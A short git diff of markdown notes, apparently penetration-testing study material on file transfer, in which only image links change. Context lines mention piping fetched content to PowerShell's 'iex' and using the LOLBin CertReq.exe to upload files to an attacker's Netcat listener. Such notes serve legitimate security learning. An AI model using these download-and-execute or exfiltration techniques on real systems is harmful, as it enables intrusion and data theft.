@@ -120,7 +120,7 @@ $a.command.a.execute | iex
 
 ### Common Errors
 
-![[Pasted image 20250916164008.png]]
+![](images/Pasted%20image%2020250916164008.png)
 
 This can be bypassed using the parameter `-UseBasicParsing`.
 
@@ -836,7 +836,7 @@ The term LOLBins (Living off the Land binaries) came from a Twitter discussion o
 ## LOLBAS
 
 To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.
-![[Pasted image 20250925161828.png]]
+![](images/Pasted%20image%2020250925161828.png)
 Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.
 
 We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.
